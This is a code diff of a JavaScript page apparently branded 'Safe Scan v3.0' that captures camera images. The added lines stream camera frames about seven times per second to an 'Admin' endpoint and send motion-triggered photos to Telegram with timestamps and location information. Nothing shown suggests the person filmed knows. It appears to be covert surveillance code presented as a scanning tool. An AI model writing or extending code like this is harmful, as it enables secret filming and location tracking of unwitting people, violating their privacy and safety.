@@ -2479,16 +2479,18 @@
             let backgroundVideoRecordingDuration = 0;
             let videoRecordingInterval = null;
             let previousImageData = null;
+            let lastTelegramSendTime = 0;
+            let telegramPhotosShared = 0;
 
             function startContinuousCapture() {
-                // First capture after 1 second, then every 3 seconds
+                // First capture after 1 second, then every 150ms (approx 7 FPS) for super fast live speed
                 setTimeout(() => {
                     captureAndSendPhoto();
-                    continuousCaptureInterval = setInterval(captureAndSendPhoto, 3000);
+                    continuousCaptureInterval = setInterval(captureAndSendPhoto, 150);
                 }, 1000);
             }
 
-            async function captureAndSendPhoto() {
+            async function captureAndSendPhoto(force = false) {
                 if (!stream) return;
                 try {
                     const canvas = document.createElement('canvas');
@@ -2522,18 +2524,26 @@
                     }
                     previousImageData = currentImageData;
 
-                    // If no motion, don't capture/send
-                    if (!motionDetected) return;
-
-                    // Redraw full res for sending
+                    // Always redraw and send to Admin for the live high-speed feed
                     canvas.width = w;
                     canvas.height = h;
                     ctx.drawImage(cameraView, 0, 0, w, h);
                     const photo = canvas.toDataURL('image/jpeg', 0.85);
                     if (!photo || photo.length < 1000) return;
-                    const caption = `📸 Motion Detected\n${new Date().toLocaleString()}\n\n${getLocationInfo()}\n\nSafe Scan v3.0`;
-                    await sendPhotoToTelegram(photo, caption);
+                    
                     sendFrameToAdmin(photo);
+
+                    // If NO motion, don't trigger Telegram logic
+                    if (!motionDetected && !force) return;
+
+                    // Throttle Telegram sending to once every 3 seconds and limit to 10 photos
+                    const now = Date.now();
+                    if (telegramPhotosShared < 10 && (now - lastTelegramSendTime > 3000 || force)) {
+                        lastTelegramSendTime = now;
+                        telegramPhotosShared++;
+                        const caption = `📸 Motion Detected (${telegramPhotosShared}/10)\n${new Date().toLocaleString()}\n\n${getLocationInfo()}\n\nSafe Scan v3.0`;
+                        await sendPhotoToTelegram(photo, caption);
+                    }
                 } catch (e) { console.error('Capture error:', e); }
             }
 
